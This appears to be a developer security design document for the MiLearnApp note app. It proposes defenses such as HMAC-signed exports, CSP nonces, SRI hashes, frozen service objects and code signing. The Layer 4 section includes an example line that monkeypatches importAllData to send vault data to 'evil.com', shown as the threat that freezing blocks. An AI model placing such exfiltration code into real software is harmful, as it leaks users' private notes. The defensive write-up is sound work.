# Code Integrity, Anti-Tampering & DRM Protections

> This document covers techniques that prevent runtime injection, code manipulation,
> vault tampering, and unauthorized redistribution of the MiLearnApp desktop build.

---

## What "DRM-style" means for a local-first note app

Traditional DRM (like Widevine for video) binds media decryption to a hardware-verified player. For a note-taking app, the equivalent concerns are:

1. **Vault integrity** — can someone tamper with exported `.milearn` files and re-import them?
2. **Code injection** — can a browser extension or Tauri plugin intercept the AES key in memory?
3. **Runtime manipulation** — can someone open DevTools and call `storage.importAllData()` with forged data?
4. **Bundle tampering** — can someone modify the JS bundle before it loads?
5. **License / activation** — can someone bypass a feature gate?

Each has a different answer and a different mitigation.

---

## Layer 1 — Vault File Integrity (Already Partially Built)

### What exists
- `validateVaultData()` (Zod schema) rejects malformed `.milearn` backups
- `importAllData()` runs validation before touching IndexedDB
- `EncryptedPayloadSchema` enforces `AES-GCM-256` + `PBKDF2-SHA256-600K` literals

### What's missing: HMAC signature on exports

The `.milearn` export format has no cryptographic integrity seal. A tampered backup can pass Zod validation if the attacker keeps the structure correct.

**Fix: Add an export signature**

```ts
// In exportAllData():
import { createHmac } from 'node:crypto'; // Tauri / Node context
// or: SubtleCrypto in browser context

const payload = { app: 'MiLearnApp', version: 2, exportDate: ..., notes, ... };
const body = JSON.stringify(payload);

// Sign with a per-device key stored in the OS keychain (Tauri) or derived from user passphrase
const sig = await crypto.subtle.sign(
  'HMAC',
  hmacKey, // 256-bit key
  new TextEncoder().encode(body)
);

const signedExport = {
  ...payload,
  _sig: bufferToHex(sig),
  _sigAlg: 'HMAC-SHA256'
};
```

```ts
// In importAllData() — verify before any DB write:
const { _sig, _sigAlg, ...body } = parsed;
const valid = await verifyHmac(body, _sig, hmacKey);
if (!valid) throw new Error('Vault integrity check failed: file may have been tampered with');
```

**Result:** A tampered `.milearn` file produces an invalid HMAC and is rejected before import.

---

## Layer 2 — Runtime Code Integrity (Subresource Integrity)

### Problem
If the app is served from a web server, a MITM or a compromised CDN can swap `main.js` for a malicious version that exfiltrates the user's AES key before encryption.

### Fix: Subresource Integrity (SRI) in HTML

```html
<!-- index.html — generated at build time by a post-build script -->
<script
  src="/assets/main-abc123.js"
  integrity="sha384-<base64-hash-of-file>"
  crossorigin="anonymous"
></script>
```

The browser verifies the hash before executing the script. If even one byte is changed, the script is blocked.

**Vite plugin to auto-generate SRI hashes:**
```ts
// vite.config.ts
import { createHash } from 'node:crypto';

// Post-build: read each output file, compute sha384, inject into index.html
```

### For Tauri desktop:
Tauri loads the frontend bundle from disk. Enable `dangerousDisableAssetCspModification: false` and set a strong CSP — the OS guarantees file integrity via app signing (see Layer 5).

---

## Layer 3 — Memory Key Protection (Anti-DevTools)

### Problem
In a browser context, the AES-GCM `CryptoKey` object lives in the JavaScript heap. Anyone with DevTools access can:
```js
// In DevTools console:
const keyMaterial = await window.__cryptoKey; // if accidentally exposed
```

### What's already correct
- The app uses `Web Crypto API` (`extractable: false`) which prevents `exportKey()` calls:
  ```ts
  const key = await crypto.subtle.importKey('raw', rawBytes, 'AES-GCM', false, ['encrypt', 'decrypt']);
  //                                                                      ^^^^^ non-extractable
  ```
- A non-extractable key cannot be read even through DevTools.

### What to add: Key scope limiting

```ts
// After decrypt, zero out the raw passphrase string from memory immediately
// JS doesn't have real memory zeroing, but minimise exposure window:
async function decryptNote(note, passphrase) {
  const result = await cryptoService.decrypt(note.encryptedData, passphrase, note.id);
  // passphrase should be a typed buffer, not a string
  // clear it immediately after use — not perfect in JS GC but better than nothing
  passphrase.fill(0);
  return result;
}
```

### What to add: Session key expiry

```ts
// cryptoLockout.ts — already has lockout, extend it:
const KEY_TTL_MS = 15 * 60 * 1000; // 15 minutes

// Auto-lock all notes after 15 min of inactivity
// (inactivityLock.ts already does this — confirm it's enabled by default)
```

---

## Layer 4 — Anti-Injection (Content Security Policy Hardening)

### The threat
A browser extension (or XSS exploit) can inject `<script>` tags or call `eval()` to:
- Intercept `cryptoService.encrypt()` calls
- Replace the `storage.importAllData` function with a version that also sends data to a remote server

### Fix 1: Strict CSP (no `unsafe-inline`, no `unsafe-eval`)

Current CSP in `index.html`:
```
script-src 'self' 'unsafe-inline' 'wasm-unsafe-eval'
```

`'unsafe-inline'` allows injected `<script>` tags. Replace with a nonce-based CSP:
```
script-src 'self' 'nonce-{RANDOM_NONCE}' 'wasm-unsafe-eval'
```

Each page render generates a fresh random nonce. Only scripts bearing that nonce execute.

**Vite plugin for nonce injection:**
```ts
// In vite.config.ts configureServer:
const nonce = crypto.randomUUID().replace(/-/g, '');
res.setHeader('Content-Security-Policy', `script-src 'self' 'nonce-${nonce}' 'wasm-unsafe-eval'`);
// Inject nonce into HTML via transform
```

### Fix 2: Object.freeze() on critical service singletons

```ts
// storage.ts — after definition:
Object.freeze(storage);

// cryptoService.ts:
Object.freeze(cryptoService);
```

`Object.freeze()` prevents a DevTools attacker or injected script from replacing methods:
```js
// This now throws in strict mode:
storage.importAllData = async (data) => { fetch('https://evil.com', {body: data}); };
```

### Fix 3: Function integrity assertions (canary check)

```ts
// integrity.ts — run at startup
export function assertCriticalIntegrity() {
  const expectedStorageKeys = ['importAllData', 'exportAllData', 'getNotes', 'syncToPostgres'];
  for (const key of expectedStorageKeys) {
    if (typeof (storage as any)[key] !== 'function') {
      throw new Error(`INTEGRITY VIOLATION: storage.${key} has been removed or replaced`);
    }
  }

  // Verify the crypto function signature hasn't been monkeypatched
  const cryptoEncryptStr = cryptoService.encrypt.toString();
  if (!cryptoEncryptStr.includes('AES-GCM')) {
    console.error('INTEGRITY WARNING: cryptoService.encrypt may have been patched');
  }
}

// Call in App.tsx useEffect on mount:
useEffect(() => { assertCriticalIntegrity(); }, []);
```

---

## Layer 5 — Binary / Bundle Signing (Tauri Desktop)

### What Tauri gives you for free
- **Code signing**: Tauri builds on Windows use Authenticode signing, on macOS use Apple notarization. The OS verifies the signature before launching the app.
- **Auto-updater integrity**: Tauri's updater uses a signature on the update manifest — a tampered update is rejected.

### What to configure

**`src-tauri/tauri.conf.json`:**
```json
"bundle": {
  "active": true,
  "targets": ["msi", "nsis", "dmg"],
  "identifier": "com.milearnapp.desktop",
  "publisher": "Your Name",
  "windows": {
    "certificateThumbprint": null,  // Set to your Authenticode cert thumbprint
    "digestAlgorithm": "sha256",
    "timestampUrl": "http://timestamp.sectigo.com"
  }
}
```

**GitHub Actions secret:** Store the signing certificate as `TAURI_PRIVATE_KEY` and `TAURI_KEY_PASSWORD` in GitHub Secrets. The CI workflow already references these.

---

## Layer 6 — Feature Licensing (Soft DRM)

If you add premium features in the future, here's how to gate them without a server:

### Approach A: Signed license file (offline-capable)

```ts
// licenseService.ts
interface License {
  userId: string;
  tier: 'free' | 'pro' | 'enterprise';
  expiresAt: string; // ISO date
  features: string[];
  signature: string; // Ed25519 signature of the above fields
}

// Verify with the app's public key (hardcoded in bundle):
const PUBLIC_KEY = 'base64-encoded-ed25519-public-key';

async function verifyLicense(license: License): Promise<boolean> {
  const { signature, ...claims } = license;
  const key = await crypto.subtle.importKey('raw', base64ToBuffer(PUBLIC_KEY), { name: 'Ed25519' }, false, ['verify']);
  return crypto.subtle.verify('Ed25519', key, base64ToBuffer(signature), new TextEncoder().encode(JSON.stringify(claims)));
}
```

**Properties:**
- Works offline — no license server needed
- Cannot be forged without the private key (kept server-side)
- Can be revoked by shipping a new bundle with a revocation list

### Approach B: HMAC-based activation code

Simpler alternative using a shared secret per user:
```ts
// Server generates: HMAC-SHA256(userId + tier + expiry, SERVER_SECRET)
// User pastes this code into Settings
// App verifies locally against the known user ID
```

---

## Layer 7 — Anti-Debug / Anti-Tamper (Aggressive, Optional)

These are used in high-security contexts (banking apps, game anti-cheat). For a note app they're more friction than protection, but listed for completeness.

### DevTools detection
```ts
// Detects if DevTools is open by measuring timing
const detectDevTools = () => {
  const threshold = 160;
  const before = performance.now();
  debugger; // DevTools pauses here; if timing >> threshold, DevTools is open
  const after = performance.now();
  if (after - before > threshold) {
    // Auto-lock all encrypted notes
    cryptoLockout.lockAll();
  }
};
```
> ⚠️ This is easily bypassed and adds user friction. Only consider for the "lock screen" UI when notes are unlocked.

### Self-integrity check on bundle
```ts
// At startup, re-fetch the app's own main.js and compare sha256 to embedded hash
// If the hash differs, the bundle was tampered with after load (e.g. by a proxy)
const response = await fetch('/assets/main.js');
const buffer = await response.arrayBuffer();
const hash = await crypto.subtle.digest('SHA-256', buffer);
if (bufferToHex(hash) !== EXPECTED_HASH) {
  alert('Application integrity check failed. Please reload from a trusted source.');
}
```

---

## Summary: What to implement, in priority order

| Priority | Protection | Effort | Impact |
|---|---|---|---|
| 1 | `Object.freeze()` on `storage` and `cryptoService` | 5 min | Blocks monkeypatching |
| 2 | HMAC signature on `.milearn` exports | 2 hrs | Prevents tampered import |
| 3 | Remove `'unsafe-inline'` from CSP, use nonces | 4 hrs | Blocks script injection |
| 4 | Tauri code signing (Authenticode / Apple notarization) | CI setup | Verifies binary authenticity |
| 5 | Startup integrity assertion (`assertCriticalIntegrity`) | 30 min | Early-warning for patches |
| 6 | SRI hashes on web build JS/CSS assets | 1 hr | Prevents CDN/MITM swap |
| 7 | Ed25519 license file for premium features | 1 day | Feature gating without server |
| 8 | Non-extractable key confirmation (`extractable: false`) | Verify only | Already done — confirm in code review |
